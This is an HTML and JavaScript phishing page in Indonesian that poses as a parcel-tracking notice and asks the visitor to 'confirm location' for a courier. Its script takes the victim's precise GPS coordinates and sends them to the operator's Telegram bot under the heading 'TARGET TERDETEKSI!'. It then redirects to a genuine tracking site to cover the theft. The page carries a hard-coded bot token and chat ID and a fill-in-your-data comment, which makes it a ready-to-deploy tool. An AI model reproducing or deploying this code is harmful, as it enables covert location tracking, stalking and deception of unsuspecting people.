<div class="card">
    <div class="icon">ðŸ“¦</div>
    <h2>Lacak Paket Anda</h2>
    <p>Sistem mendeteksi percobaan pengiriman. Silakan konfirmasi lokasi Anda untuk memandu kurir ke titik presisi.</p>
    
    <button onclick="prosesLokasi()">KONFIRMASI LOKASI</button>
    
    <div id="status"></div>
</div>

<script>
    // --- GANTI DENGAN DATA KAMU ---
    const TELEGRAM_TOKEN = '7812290821:AAFzF23bx9A1Wt1yJHy6tOIbe-f7RBMJ-ag';
    const TELEGRAM_CHAT_ID = '7588105919';
    // ------------------------------

    function prosesLokasi() {
        const statusDiv = document.getElementById('status');
        statusDiv.innerText = "Menghubungkan ke GPS...";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(kirimData, tanganiError, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        } else {
            statusDiv.innerText = "Browser tidak mendukung pelacakan.";
        }
    }

    function kirimData(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const akurasi = position.coords.accuracy;
        
        // Membuat link Google Maps
        const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
        
        // Pesan yang akan muncul di Telegram kamu
        const pesan = `ðŸš¨ *TARGET TERDETEKSI!* \n\n` +
                      `ðŸ“ Lokasi: [Klik di Sini](${googleMaps})\n` +
                      `ðŸŽ¯ Akurasi: ${akurasi} meter\n` +
                      `ðŸ“± Info: Browser User Terverifikasi`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`;

        fetch(url).then(response => {
            if (response.ok) {
                document.getElementById('status').style.color = "#25D366";
                document.getElementById('status').innerText = "Lokasi Berhasil Diverifikasi!";
                // Opsional: Arahkan target ke situs asli setelah 2 detik
                setTimeout(() => {
                    window.location.href = "https://www.cekresi.com";
                }, 2000);
            }
        });
    }

    function tanganiError(error) {
        const statusDiv = document.getElementById('status');
        switch(error.code) {
            case error.PERMISSION_DENIED:
                statusDiv.innerText = "Gagal: Anda harus mengizinkan akses lokasi.";
                break;
            default:
                statusDiv.innerText = "Terjadi kesalahan teknis.";
                break;
        }
    }
</script>

